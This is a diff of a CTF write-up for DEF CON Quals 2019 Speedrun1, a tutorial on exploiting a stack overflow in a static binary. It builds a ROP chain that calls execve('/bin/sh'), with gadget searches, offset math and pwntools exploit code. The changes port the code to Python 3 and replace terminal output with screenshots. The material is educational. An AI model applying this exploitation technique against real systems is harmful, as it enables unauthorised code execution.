@@ -1,38 +1,14 @@
 # Defcon Quals 2019 Speedrun1
 
-Let's take a look at the binary:
-```
-$    file speedrun-001
-speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
-$    pwn checksec speedrun-001
-[*] '/Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-$    ./speedrun-001
-Hello brave new challenger
-Any last words?
-15935728
-This will be the last thing that you say: 15935728
+This was done on `Ubuntu 20.04.4 LTS`.
 
-Alas, you had no luck today.
-```
+Let's take a look at the binary:
+
+![intro_data](pics/intro_data.png)
 
 So we can see that we are dealing with a 64 bit statically compiled binary. This binary has NX (Non-Executable stack) enabled, which means that the stack memory region is not executable. For more info on this, we can check the memory mappings with the `vmmap` command while the binary is running:
 
-```
-gef➤  vmmap
-Start              End                Offset             Perm Path
-0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
-0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
-0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
-0x00007ffff7ffa000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
-0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
-0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
-0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-```
+![vmmap](pics/vmmap.png)
 
 Here we can see that the memory region for the stack begins at `0x00007ffffffde000` and ends at `0x00007ffffffff000`. We can see that the permissions are `rw`. There are three different permissions you can assign to a memory region, `r` for it to be readable, `w` for it to be writable, and `x` for it to be executable. Since the stack has the permissions `rw` assigned to it, we can read and write to it. So pushing shellcode onto the stack and executing it isn't an option.
 
@@ -105,72 +81,21 @@ gef➤  bt
 #4  0x0000000000400a5a in ?? ()
 ```
 
-After this I started jumping to the various addresses listed there (you can just push `g` in ghidra and enter the address), and looked at the decompiled code to see what's interesting. After jumping to a few of them, `0x400c1d` looks like it's the main function:
+After this I started jumping to the various addresses listed there (you can just push `g` in ghidra and enter the address), and looked at the decompiled code to see what's interesting. After jumping to a few of them, `0x400c1d` looks like it's the main function (with that function starting at `0x00400bc1`):
 
-```
-
-undefined8
-main(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3,undefined8 uParm4,undefined8 uParm5,
-    undefined8 uParm6)
-
-{
-  long lVar1;
- 
-  FUN_00410590(PTR_DAT_006b97a0,0,2,0,uParm5,uParm6,uParm2);
-  lVar1 = FUN_0040e790("DEBUG");
-  if (lVar1 == 0) {
-    FUN_00449040(5);
-  }
-  FUN_00400b4d();
-  FUN_00400b60();
-  FUN_00400bae();
-  return 0;
-}
-```
+![main](pics/main.png)
 
 When we look at the functions `FUN_00400b4d` and ` FUN_00400bae`, we see that the essentially just print out text (which matches with what we saw earlier). Looking at the `FUN_00400b60` function shows us something interesting:
 
-```
-void interesting(void)
-
-{
-  undefined input [1024];
- 
-  FUN_00410390("Any last words?");
-  FUN_004498a0(0,input,2000);
-  FUN_0040f710("This will be the last thing that you say: %s\n",input);
-  return;
-}
-```
+![interesting](pics/interesting.png)
 
 So we can see it prints out a message, runs a function (which is based on using the binary and the order of the messages, probably scans in data), then prints a message with our input. Looking at the function `FUN_004498a0`, it seems a bit weird:
 
-```
-/* WARNING: Removing unreachable block (ram,0x00449910) */
-/* WARNING: Removing unreachable block (ram,0x00449924) */
-
-undefined8 FUN_004498a0(undefined8 uParm1,undefined8 uParm2,undefined8 uParm3)
-
-{
-  uint uVar1;
- 
-  if (DAT_006bc80c == 0) {
-    syscall();
-    return 0;
-  }
-  uVar1 = FUN_0044be40();
-  syscall();
-  FUN_0044bea0((ulong)uVar1,uParm2,uParm3);
-  return 0;
-}
-```
+![004498a0](pics/004498a0.png)
 
 It appears to be scanning in our input by making a syscall, versus using a function like `scanf` or `fgets`. A syscall is essentially a way for your program to request your OS or Kernel to do something. Looking at the assembly code, we see that it sets the `RAX` register equal to `0` by xoring `eax` by itself. For the linux `x64` architecture, the contents of the `rax` register decides what syscall gets executed. And when we look on the sycall chart (https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) we see that it corresponds to the `read` syscall. We don't see the arguments being loaded for the syscall, since they were already loaded when this function was called. The arguments this function takes (and the registers they take it in) are the same as the read syscall, so it can just call it after it zeroes at `rax`. More on syscalls to come:
 
-```
-        004498aa 31 c0           XOR        EAX,EAX
-        004498ac 0f 05           SYSCALL
-```
+![syscall](pics/syscall.png)
 
 So with that, we can see it is scanning in `2000` bytes worth of input into `input` which can hold `1024` bytes. We have an overflow that we can overwrite the return address with and get code execution. The question now is what to do with it?
 
@@ -187,23 +112,7 @@ rdx:    0                    specify no environment variables passed
 
 Now our ROP Chain will have three parts. The first will be to write `/bin/sh` somewhere in memory, and move the pointer to it into the `rdi` register. The second will be to move the necessary values into the other three registers. The third will be to make the syscall itself. Other than finding the gadgets to execute, the only thing we need to really do prior to writing the exploit is finding a place in memory to write `/bin/sh`. Let's check the memory mappings while the elf is running to see what we have to work with:
 
-```
-gef➤  vmmap
-Start              End                Offset             Perm Path
-0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
-0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /Hackery/pod/modules/bof_static/dcquals19_speedrun1/speedrun-001
-0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
-0x00007ffff7ffa000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
-0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
-0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
-0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
-gef➤  x/10g 0x6b6000
-0x6b6000:    0x0    0x0
-0x6b6010:    0x0    0x0
-0x6b6020:    0x0    0x0
-0x6b6030:    0x0    0x0
-0x6b6040:    0x0    0x0
-```
+![vmmap_mem](pics/vmmap_mem.png)
 
 Looking at this, the elf memory region between `0x6b6000` - `0x6bc000` looks pretty good. I'll probably go with the address `0x6b6000`. There are a few reasons why I choose this. The first is that it is from the elf's memory space that doesn't have PIE, so we know what the address is without an infoleak. In addition to that, the permissions are `rw` so we can read and write to it. Also there doesn't appear to be anything stored there at the moment, so it probably won't mess things up if we store it there. Also let's find the offset between the start of our input and the return address using the same method I've used before:
 
@@ -279,10 +188,10 @@ Stack level 0, frame at 0x7fffffffde40:
   rbp at 0x7fffffffde30, rip at 0x7fffffffde38
 ```
 
-So we can see that the offset is `0x7fffffffde38 - 0x7fffffffda30 = 0x408` bytes. With that, the last thing we need is to find the ROP gadgets we will use. This time we will be using a utility called `ROPgadget` from https://github.com/JonathanSalwan/ROPgadget. This will just be a python script which will give us gadgets for a binary we give it. First let's just get four gadgets to just pop values into the four registers we need:
+So we can see that the offset is `0x7fffffffde38 - 0x7fffffffda30 = 0x408` bytes. With that, the last thing we need is to find the ROP gadgets we will use. This time we will be using a utility called `ROPgadget` from https://github.com/JonathanSalwan/ROPgadget (not included as part of nightmare). This will just be a python script which will give us gadgets for a binary we give it. First let's just get four gadgets to just pop values into the four registers we need:
 
 ```
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
+$   python3 ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
 0x0000000000415662 : add ch, al ; pop rax ; ret
 0x0000000000415661 : cli ; add ch, al ; pop rax ; ret
 0x00000000004a9321 : in al, 0x4c ; pop rax ; retf
@@ -290,25 +199,29 @@ $    python ROPgadget.py --binary speedrun-001 | grep "pop rax ; ret"
 0x000000000048cccb : pop rax ; ret 0x22
 0x00000000004a9323 : pop rax ; retf
 0x00000000004758a3 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"
+$   python3 ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"
 0x0000000000423788 : add byte ptr [rax - 0x77], cl ; fsubp st(0) ; pop rdi ; ret
 0x000000000042378b : fsubp st(0) ; pop rdi ; ret
 0x0000000000400686 : pop rdi ; ret
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
+$   python3 ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
 0x000000000046759d : add byte ptr [rbp + rcx*4 + 0x35], cl ; pop rsi ; ret
 0x000000000048ac68 : cmp byte ptr [rbx + 0x41], bl ; pop rsi ; ret
 0x000000000044be39 : pop rdx ; pop rsi ; ret
 0x00000000004101f3 : pop rsi ; ret
-$    python ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
-0x00000000004a8881 : js 0x4a8901 ; pop rdx ; retf
+$   python3 ROPgadget.py --binary speedrun-001 | grep "pop rdx ; ret"
+0x00000000004a8881 : js 0x4a88fe ; pop rdx ; retf
 0x00000000004498b5 : pop rdx ; ret
 0x000000000045fe71 : pop rdx ; retf
 ```
 
+Which we see right here:
+
+![gadgets](pics/gadgets.png)
+
 So we found our four gadgets at the addresses `0x415664`, `0x400686`, `0x4101f3`, and `0x4498b5`. Next we will need a gadget which will write the string `/bin/sh` somewhere to memory. For this I looked through all of the gadgets with a `mov` instruction:
 
 ```
-$    python ROPgadget.py --binary speedrun-001 | grep "mov" | less
+$    python3 ROPgadget.py --binary speedrun-001 | grep "mov" | less
 ```
 
 Looking through the giant list, this one seems like it would fit our needs perfectly:
@@ -320,7 +233,7 @@ Looking through the giant list, this one seems like it would fit our needs perfe
 This gadget will allow us to write an `8` byte value stored in `rdx` to whatever address is pointed to by the `rax` register. In addition it's kind of convenient since we can use the four gadgets we found earlier to prep this write. Lastly we just need to find a gadget for `syscall`:
 
 ```
-$    python ROPgadget.py --binary speedrun-001 | grep ": syscall"
+$    python3 ROPgadget.py --binary speedrun-001 | grep ": syscall"
 0x000000000040129c : syscall
 ```
 
@@ -352,9 +265,9 @@ pop rdx, 0x2f62696e2f736800
 pop rax, 0x6b6000
 mov qword ptr [rax], rdx
 '''
-rop = ''
+rop = b""
 rop += popRdx
-rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
+rop += b"/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
 rop += popRax
 rop += p64(0x6b6000)
 rop += writeGadget
@@ -385,7 +298,7 @@ rop += syscall
 
 
 # Add the padding to the saved return address
-payload = "0"*0x408 + rop
+payload = b"0"*0x408 + rop
 
 # Send the payload, drop to an interactive shell to use our new shell
 target.sendline(payload)
@@ -394,19 +307,7 @@ target.interactive()
 ```
 
 When we run it:
-```
-$    python exploit.py
-[+] Starting local process './speedrun-001': pid 12189
-[*] Switching to interactive mode
-Hello brave new challenger
-Any last words?
-This will be the last thing that you say: 000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\xb5\x98D
-$ w
- 03:19:37 up 13:12,  1 user,  load average: 0.51, 0.97, 0.88
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu :0       :0               Wed14   ?xdm?  14:26   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
-$ ls
-exploit.py  readme.md  speedrun-001
-```
+
+![running_exploit](pics/running_exploit.png)
 
 Just like that, we popped a shell!
